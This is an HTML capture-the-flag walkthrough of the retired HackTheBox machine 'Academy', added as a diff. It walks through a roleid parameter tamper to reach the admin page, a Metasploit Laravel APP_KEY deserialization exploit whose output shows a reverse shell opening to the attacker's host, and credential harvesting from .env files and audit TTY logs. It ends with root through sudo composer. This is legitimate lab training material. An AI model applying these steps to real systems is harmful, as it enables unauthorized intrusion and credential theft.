@@ -1,0 +1,303 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="static/css/style.css">
+</head>
+
+<body>
+    <aside>
+        <iframe src="nav.html"></iframe>
+    </aside>
+
+    <aside class="index">
+        <h1>page index</h1>
+        <ol>
+            <li><a href="#information">information</a></li>
+            <li><a href="#foothold">foothold</a></li>
+            <li><a href="#users">users</a></li>
+            <ul>
+                <li><a href="#credentials">searching for credentials</a></li>
+                <li><a href="#first">first user</a></li>
+                <li><a href="#second">second user</a></li>
+            </ul>
+            <li><a href="#root">root</a></li>
+        </ol>
+    </aside>
+
+    <article>
+        <h1>Academy</h1>
+
+        <section id="information">
+            <h2>1. Information</h2>
+            <ul>
+                <li> Linux</li>
+                <li> Easy class</li>
+                <li> Released Nov 2020</li>
+                <li> Retired Mar 2021</li>
+            </ul>
+
+            <p> Academy is an easy-rated machine based mostly on reconnaissance and hunting for credentials. It also
+                features a <span>composer</span> exploit.</p>
+        </section>
+
+
+        <section id="foothold">
+            <h2>2. Foothold</h2>
+
+            <p>
+                Sometimes HTB boxes will have HTTP servers configured only for <span>name.htb</span> style virtual
+                hosts, so let's add the host to
+                <span>/etc/hosts</span> first.
+
+                <code>
+    echo "10.10.10.125 dev-staging-01.academy.htb" | sudo tee --append /etc/hosts
+                </code>
+
+                Running <span>nmap -sC -sV -T4 -v academy.htb</span> reveals two open TCP ports, 22 (SSH) and 80 (HTTP).
+            </p>
+            <code>
+    ...
+    Not shown: 998 closed ports
+    PORT STATE SERVICE VERSION
+    22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
+    | http-methods:
+    |_ Supported Methods: GET HEAD POST OPTIONS
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-title: Did not follow redirect to http://academy.htb/
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    ...
+            </code>
+
+            <p> Opening the browser and pointing it to <span>http://academy.htb</span> will end up on a basic landing
+                page with links to login and register. Looking at the register page source shows it has a hidden
+                <span>roleid</span> field that is sent in the form data.
+                Creating a user will allow us to login to the <span>academy.htb</span> site.
+            </p>
+
+            <figure>
+                <img src="static/img/academy_1.jpg">
+                <figcaption>Web app front page after logging in</figcaption>
+            </figure>
+
+            <p>
+                However, nothing seems to be working in this site.
+            </p>
+            <p>
+                The <span>roleid</span> parameter will prove useful. Poking at the PHP application, it seems
+                <span>admin.php</span> is a valid path and would point to an admin login (you may guess this since it's
+                a typical configuration, although <span>gobuster dir -u http://academy.htb -w
+                    /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php</span> will tell you just as
+                much).
+                The default seems to be <span>0</span>. Changing it to <span>1</span> in Burpsuite and trying to log in
+                via
+                <span>/admin.php</span> is successful and redirects to a different page.
+            </p>
+            <img src="static/img/academy_2.jpg">
+            <figcaption>Modifying the POST request in Burp</figcaption>
+            </figure>
+
+            <p>
+                This is a typical case where an application server will misplace trust in client supplied data, e.g.
+                setting
+                the user permission level from the client, something an unauthorized user should normally not be able to
+                do.
+            </p>
+
+            <p>
+                Now let's visit the admin page.
+            </p>
+            <figure>
+                <img src="static/img/academy_3.jpg">
+                <figcaption>Web app admin page after logging in</figcaption>
+            </figure>
+            Here, a subdomain of <span>academy.htb</span> is listed in a launch planner in the landing page after
+            login. Let's add it to our hosts and visit.
+            </p>
+
+            <code>
+    echo "10.10.10.125 dev-staging-01.academy.htb" | sudo tee --append /etc/hosts
+            </code>
+
+            <p> Fortunately for us, the staging site runs into an error. Applications configured for staging still might
+                be configured
+                to display debug information. Modern web apps will in this case often display a stack trace of the error
+                and optionally dump the application environment to help with debugging.
+            </p>
+
+            <p> By the looks of it the enviroment dump has some potentially useful information, for example the Laravel
+                <span>APP_KEY</span>,
+                <span>DB_USERNAME</span>, <span>DB_PASSWORD</span> and some information about other services running on
+                the
+                machine.
+            </p>
+
+            <p>A search for <span>laravel rce</span>
+                might lead you to <a href="https://github.com/ravidhr/laravel_rce">this page</a> which looks useful if
+                you know the Laravel <span>APP_KEY</span> environment variable. Looking further, it seems that
+                Metasploit has this exploit implemented in
+                <span>exploit/unix/http/laravel_token_unserialize_exec</span>. Configuring and running it will net a
+                <span>www-data</span> shell at <span>/var/www/html/htb-academy-dev-01/public</span>.
+            </p>
+
+            <code>
+    msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit
+/var/www/html/htb-academy-dev-01/public
+    ...
+    [*] Started reverse TCP handler on 10.10.14.48:4444
+    [*] Command shell session 1 opened (10.10.14.48:4444 -> 10.129.110.239:45360) at 2021-03-09 12:59:14 +0000
+
+
+    ls
+    css
+    favicon.ico
+    index.php
+    js
+    robots.txt
+    web.config
+    id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            </code>
+
+            <p>Now let's upgrade our shell with <span>python3 -c "import pty;pty.spawn('/bin/bash')"</span> and start
+                looking around.</p>
+        </section>
+
+        <section id="users">
+            <h2>Obtaining users</h2>
+
+            <span>cat /etc/passwd</span> tells us there are several regular users with login shells configured on this
+            machine. A quick <span> cd /home && ls *</span> shows that <span>cry0l1t3</span> has the user flag. This
+            user was also shown in the admin landing page after logging in.
+
+
+            <section id="credentials">
+                <h3>Searching for credentials</h3>
+
+
+                <p>Looking around <span>/var/www/html</span> shows that it contains the <span>academy</span> application
+                    data
+                    as well as the staging application.
+                </p>
+                <p>
+                    The <span>/var/www/html/htb-academy-dev-01</span> directory contains a hidden <span>.env</span>
+                    file, containing the staging application environment.
+                    A <span>netstat -plunt</span> shows that there really is a MySQL server listening to the loopback
+                    interface. However, the MySQL credentials obtained from the staging app do not work and it looks
+                    like a
+                    red herring.
+                </p>
+
+                <p> Fortunately, if you look around the <span>academy</span> application it also has an environment
+                    file.
+                    Here we find many of the same configurations but with different entries.
+                </p>
+                <code>
+    ...
+    DB_CONNECTION=mysql
+    DB_HOST=127.0.0.1
+    DB_PORT=3306
+    DB_DATABASE=academy
+    DB_USERNAME=dev
+    DB_PASSWORD=mySup3rP4s5w0rd!!
+    ...
+        </code>
+            </section>
+
+            <section id="first">
+                <h3>First user</h3>
+                Trying <span>mySup3rP4s5w0rd!!</span> to log in with all the users will eventually drop you a shell for
+                <span>cry0l1t3</span>.
+                We can then upgrade to a more stable SSH session without a key, since password logins are enabled
+                (<span>cat
+                    /etc/ssh/sshd_config | grep Password</span> will confirm this).
+
+                <code>
+    www-data@academy:/var/www/html/academy$ su cry0l1t3
+    su cry0l1t3
+    Password: mySup3rP4s5w0rd!!
+    
+    $ id
+    id
+    uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
+            </code>
+
+                <span>/home/cry0l1t3</span> contains the user flag, which we promptly grab.
+
+            </section>
+
+            <section id="second">
+                <h3>Second user</h3>
+
+                <span>cry0l1t3</span> doesn't have any <span>sudo</span> permissions, but belongs to a special group
+                <span>adm</span>.
+                It might
+                be useful to
+                check
+                what
+                files the <span>adm</span> group has access to, with the command <span>find / -group adm</span>.
+
+                <span>/var/log/audit</span> seems to be in the results.
+
+                <p>
+                    Searching for this online may reveal that these are
+                    generated by an audit log daemon called <span>aureport</span>. Since <span>cry0l1t3</span> can run
+                    it,
+                    we can look around. Particularly of interest is <span>aureport --tty</span>, which shows tty
+                    keystroke
+                    logs.
+                </p>
+
+                <code>
+    cry0l1t3@academy:/var/log/audit$ aureport --tty
+
+    TTY Report
+    ===============================================
+    # date time event auid term sess comm data
+    ===============================================
+    Error opening config file (Permission denied)
+    NOTE - using built-in logs: /var/log/audit/audit.log
+    1. 08/12/20 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
+    2. 08/12/20 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
+    3. 08/12/20 02:28:24 89 0 ? 1 sh "whoami",<nl>
+    4. 08/12/20 02:28:28 90 0 ? 1 sh "exit",<nl>
+    5. 08/12/20 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
+                </code>
+
+                Someone seems to have logged as <span>mrb3n</span> with <span>su</span>. The password works and yields a
+                shell.
+            </section>
+        </section>
+
+        <section id="root">
+            <h2>Obtaining root</h2>
+
+            <p>
+                Running <span>sudo -l</span> explains that there's a <span>sudo</span> entry for the current user.
+            </p>
+
+            <code>
+    $ sudo -l
+    Matching Defaults entries for mrb3n on academy:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User mrb3n may run the following commands on academy:
+        (ALL) /usr/bin/composer
+            </code>
+            <p>Using
+                <span>sudo</span> to escalate privileges is a common tactic, so looking for common exploits for this
+                software may prove useful.
+            </p>
+
+            <p> Looking online for <span>unix composer exploit</span>, it seems to have a <a
+                    href="https://gtfobins.github.io/gtfobins/composer/">known vulnerability</a> that allows obtaining
+                root
+                by
+                executing arbitrary code as root.
+
+                This will directly give us a root shell and fetch the root flag.</p>
+        </section>
+    </article>
+</body>
+
+</html>
